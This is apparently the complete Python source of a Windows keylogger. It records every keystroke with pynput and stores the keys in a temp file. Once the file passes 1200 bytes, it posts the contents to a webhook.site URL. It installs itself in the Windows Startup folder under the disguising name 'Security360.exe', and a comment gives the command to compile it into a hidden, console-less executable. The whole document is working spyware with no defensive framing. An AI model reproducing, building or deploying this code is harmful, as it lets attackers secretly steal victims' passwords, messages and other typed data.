from datetime import datetime
from os import getcwd,path
from shutil import copy
from pynput.keyboard import  Key,Listener
from requests import post
# python -m nuitka --follow-imports --disable-console --minigw64 keylog.py --standalone --onefile
# C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp

Keys=[]
Count=0
User=path.expanduser("~")
def Copy():
	copy(getcwd()+"Security360.exe","C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")

def writeF(Keys):
	if not path.exists(f"{User}/AppData/Local/Temp/File.txt"): open(f"{User}/AppData/Local/Temp/File.txt","w")
	with open(f"{User}/AppData/Local/Temp/File.txt","a") as f:
		for key in Keys:
			f.write(str(key))

def Send(F):
	url="https://webhook.site/678e2561-e673-451e-b915-1654a7acd4b2"
	r=post(url,data=F)

def onPress(key):
	global Keys,Count
	Count+=1
	key=str(key).replace("'","")
	if key=="Key.space":key=" "
	if key=="Key.backspace":key="/b"
	if key=="Key.enter":key="/n"
	if key=="Key.shift":key=""
	if "ctrl" in key: key="Ctrl"
	if "Key" in key: key=" "+key+" "
	Keys.append(key)
	print(key)
	if Count>25:
		writeF(Keys)
		Count=0
		Keys=[datetime.now().strftime("\n\n>> %d-%m-%Y, %H:%M:%S\n\n")]
	if path.getsize(f"{User}/AppData/Local/Temp/File.txt")>1200:
		try:
			with open(f"{User}/AppData/Local/Temp/File.txt","r") as f:
				Dat=[]
				for line in f:
					Dat.append(line)
				Send(*Dat)
			with open(f"{User}/AppData/Local/Temp/File.txt","w") as f: f.write("")
		except: pass

try:
	if getcwd()!="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp": Copy()
except:pass

with Listener(on_press=onPress) as L:
	L.join()